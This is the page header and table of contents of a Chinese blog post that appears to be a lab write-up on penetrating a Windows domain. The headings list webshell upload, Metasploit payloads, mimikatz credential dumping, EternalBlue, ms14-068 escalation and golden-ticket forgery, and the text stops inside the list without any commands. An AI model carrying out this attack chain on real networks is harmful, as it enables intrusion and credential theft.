+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/MxJikiQrkwhKLqIMWvaFK00M4MhLbDc_ce9cUl4KOtk.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/yKcsK5s97h1tnWenrQj_LerdmVCsBvSZy_hkKXdKOQU.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/KV3dgaTfC0rmzdw8ZKPrHzRggGtQ3ZW0gHPgMN_nV08.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/rFU-eUopnDduTOzor2Ig-aW-80OOA6krqGYQbSw999M.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/BZm0L6WL4kMgCdgcyBBgVhaE8JzZYWkyVnkoR4ngm1I.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/79F5Fj4hzWBkyB5WpRuXQE7lJAON0qePnvytxhzxWsE.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/mA0wDxcU4g9fbpWd3y125Ku0uzn3uOxa399_fJXbNvA.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/XhKg3MXmMCuj1MzJxUj2idVo80MeUQog61MFOyVsdHg.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/VQ3s7r-SOQb2iLfD4brj9RTvSgV2cWGQgJyZeJknqPQ.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/IhiC0Zp6jOCjmKTo6cTmvMD4rnE-gVfd39yjTfXQeTg.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/9AT_1I_2qT6nKyblCU-EpBMjgKfvcDVgJpdj9cFfDKE.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/nZW70taEOK9-l4__g3sIl4xiXvs6r0NlAd5xU8YQz9A.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/3wEcr-sKIX8RWzRw_PSh_dLR6HltQNXLoglXL2Sr5ZE.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/LFSYccUwPXtUVA3GeJ2Gp-gfGE-T3_5be21q25c8LNE.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/oWN7ziYXSnOwmxX08zYI0k8pmtmmfwC2ianXvAUxF94.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/b2AdoNhpPRREAnlU-u2HrgHlXIvyXAbUbmfE5p-UvzU.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/qYnk7cdpbpflPo5Hxcn5poGzbM1IA7m_UxSVF8LFCDI.png">
+<meta property="og:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/Lg-KTweC8rhCZG9AZKRtDzqQ5wqli1nibNrNwJtPUMo.png">
+<meta property="article:published_time" content="2021-11-14T11:38:38.000Z">
+<meta property="article:modified_time" content="2023-05-29T14:33:00.148Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="域渗透">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="打点">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/NFWgEW1x5hckIW3rsJbmIdedkVrToiaVZpKA9fD4xXU.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>打靶日记（三）完整的内网域渗透</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2021/12/01/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89%E6%B8%97%E9%80%8F%E6%9C%89%E9%98%B2%E6%8A%A4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&text=打靶日记（三）完整的内网域渗透"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&title=打靶日记（三）完整的内网域渗透"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&is_video=false&description=打靶日记（三）完整的内网域渗透"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=打靶日记（三）完整的内网域渗透&body=Check out this article: https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&title=打靶日记（三）完整的内网域渗透"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&title=打靶日记（三）完整的内网域渗透"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&title=打靶日记（三）完整的内网域渗透"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&title=打靶日记（三）完整的内网域渗透"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&name=打靶日记（三）完整的内网域渗透&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&t=打靶日记（三）完整的内网域渗透"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text">打靶日记（三）完整的内网域渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">1.环境介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1%E7%8E%AF%E5%A2%83%E5%9B%BE"><span class="toc-number">2.1.</span> <span class="toc-text">1.1环境图</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">2.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1masscan-%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.1.</span> <span class="toc-text">2.1masscan 端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3nmap-%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%AB%AF%E5%8F%A3%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">3.2.</span> <span class="toc-text">2.3nmap 获取系统和端口版本信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%AF%B9%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"><span class="toc-number">4.</span> <span class="toc-text">3.对网站进行安全检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E7%BB%91%E5%AE%9A-hosts"><span class="toc-number">4.1.</span> <span class="toc-text">3.1.绑定 hosts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2gobuster-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%89%AB%E6%8F%8F"><span class="toc-number">4.2.</span> <span class="toc-text">3.2gobuster 目录文件扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-svn-%E9%81%8D%E5%8E%86%E6%BA%90%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.3.</span> <span class="toc-text">3.3 .svn 遍历源代码漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4wc-db-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">4.4.</span> <span class="toc-text">3.4wc.db 文件下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5thinkphp-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">4.5.</span> <span class="toc-text">3.5thinkphp 日志文件泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6python-%E7%BC%96%E5%86%99%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">4.6.</span> <span class="toc-text">3.6python 编写日志文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86%E5%AF%86%E6%96%87"><span class="toc-number">4.7.</span> <span class="toc-text">3.7发现管理密文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-8%E7%BB%91%E5%AE%9A-hosts-%E7%A2%B0%E6%92%9E%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-number">4.8.</span> <span class="toc-text">3.8绑定 hosts 碰撞管理后台子域名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-9%E5%90%8E%E5%8F%B0%E9%AA%8C%E8%AF%81%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.9.</span> <span class="toc-text">3.9后台验证码逻辑漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-10-%E8%AE%BE%E7%BD%AE%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%8B%BF-webshell"><span class="toc-number">4.10.</span> <span class="toc-text">3.10. 设置上传文件类型拿 webshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4metasploit-%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83%E5%92%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">5.</span> <span class="toc-text">4metasploit 进行提权和信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E7%94%9F%E6%88%90%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">5.1.</span> <span class="toc-text">4.1.生成攻击载荷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2%E7%9B%91%E5%90%AC%E4%B8%8A%E7%BA%BF"><span class="toc-number">5.2.</span> <span class="toc-text">4.2监听上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3migrate-%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B"><span class="toc-number">5.3.</span> <span class="toc-text">4.3migrate 迁移进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-mimikatz-%E5%93%88%E5%B8%8C%E6%98%8E%E6%96%87%E8%8E%B7%E5%8F%96"><span class="toc-number">5.4.</span> <span class="toc-text">4.4.mimikatz 哈希明文获取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E8%B7%A8%E7%BD%91%E6%AE%B5%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">6.</span> <span class="toc-text">5.跨网段域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-metasploit-%E8%B7%A8%E7%BD%91%E6%AE%B5%E7%9A%84%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">6.1.</span> <span class="toc-text">5.1.metasploit 跨网段的域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-1%E7%A1%AE%E5%AE%9A%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-number">6.1.1.</span> <span class="toc-text">5.1.1确定域环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-2%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7"><span class="toc-number">6.1.2.</span> <span class="toc-text">5.1.2定位域控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-3%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">6.1.3.</span> <span class="toc-text">5.1.3域信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-4%E7%BB%88%E7%AB%AF%E8%AE%BE%E7%BD%AE%E4%B9%B1%E7%A0%81"><span class="toc-number">6.1.4.</span> <span class="toc-text">5.1.4终端设置乱码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-5%E7%BB%88%E7%AB%AF%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4"><span class="toc-number">6.1.5.</span> <span class="toc-text">5.1.5终端执行命令信息收集命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-6%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%BF%87%E7%9A%84%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">6.1.6.</span> <span class="toc-text">5.1.6获取登录过的用户信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-7%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%E6%B8%97%E9%80%8F-DC-%E5%9F%9F%E6%8E%A7"><span class="toc-number">6.1.7.</span> <span class="toc-text">5.1.7添加路由渗透 DC 域控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-8%E5%BC%80%E5%90%AF%E4%BB%A3%E7%90%86"><span class="toc-number">6.1.8.</span> <span class="toc-text">5.1.8开启代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-9-%E8%AE%BE%E7%BD%AE-porychanins-%E4%BB%A3%E7%90%86-nmap-%E6%89%AB%E6%8F%8F"><span class="toc-number">6.1.9.</span> <span class="toc-text">5.1.9.设置 porychanins 代理 nmap 扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-10%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010-%E8%BF%9B%E8%A1%8C%E6%BA%A2%E5%87%BA"><span class="toc-number">6.1.10.</span> <span class="toc-text">5.1.10永恒之蓝 ms17_010 进行溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-11ms14-068-%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">6.1.11.</span> <span class="toc-text">5.1.11ms14-068 的条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-12%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">6.1.12.</span> <span class="toc-text">5.1.12开启远程桌面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-13ms14-068-%E6%8F%90%E6%9D%83%E5%9F%9F%E6%8E%A7"><span class="toc-number">6.1.13.</span> <span class="toc-text">5.1.13ms14-068 提权域控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-13-1-ms14-068-exe-%E5%88%9B%E5%BB%BA%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.13.1.</span> <span class="toc-text">5.1.13.1. ms14-068.exe 创建票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-13-2%E8%BD%BD%E5%85%A5-kiwi"><span class="toc-number">6.1.13.2.</span> <span class="toc-text">5.1.13.2载入 kiwi</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-13-3%E6%B8%85%E7%90%86%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.13.3.</span> <span class="toc-text">5.1.13.3清理票据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-14-%E8%8E%B7%E5%8F%96-dc-%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90"><span class="toc-number">6.1.14.</span> <span class="toc-text">5.1.14. 获取 dc 域控权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-14-1-%E7%94%9F%E6%88%90%E6%AD%A3%E5%90%91%E8%BD%BD%E8%8D%B7"><span class="toc-number">6.1.14.1.</span> <span class="toc-text">5.1.14.1. 生成正向载荷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-14-2-copy-%E5%A4%8D%E5%88%B6%E5%88%B0%E5%9F%9F%E6%8E%A7"><span class="toc-number">6.1.14.2.</span> <span class="toc-text">5.1.14.2. copy 复制到域控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-14-3-at-%E6%89%A7%E8%A1%8C%E4%BB%BB%E5%8A%A1%E8%BF%90%E8%A1%8C-exe"><span class="toc-number">6.1.14.3.</span> <span class="toc-text">5.1.14.3. at 执行任务运行 exe</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-15%E8%8E%B7%E5%8F%96-dc-%E5%9F%9F%E6%8E%A7%E5%93%88%E5%B8%8C%E6%98%8E%E6%96%87"><span class="toc-number">6.1.15.</span> <span class="toc-text">5.1.15获取 dc 域控哈希明文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-16-%E6%8A%93%E5%9F%9F%E6%8E%A7%E5%85%A8%E9%83%A8-hash"><span class="toc-number">6.1.16.</span> <span class="toc-text">5.1.16. 抓域控全部 hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-17%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.17.</span> <span class="toc-text">5.1.17制作黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-18%E8%8E%B7%E5%8F%96-ntml-sid-rid"><span class="toc-number">6.1.18.</span> <span class="toc-text">5.1.18获取 ntml sid rid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-19%E7%AA%83%E5%8F%96-%E5%9F%9F%E6%8E%A7%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90"><span class="toc-number">6.1.19.</span> <span class="toc-text">5.1.19窃取 域控超级管理权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-20%E7%94%9F%E6%88%90%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.20.</span> <span class="toc-text">5.1.20生成黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 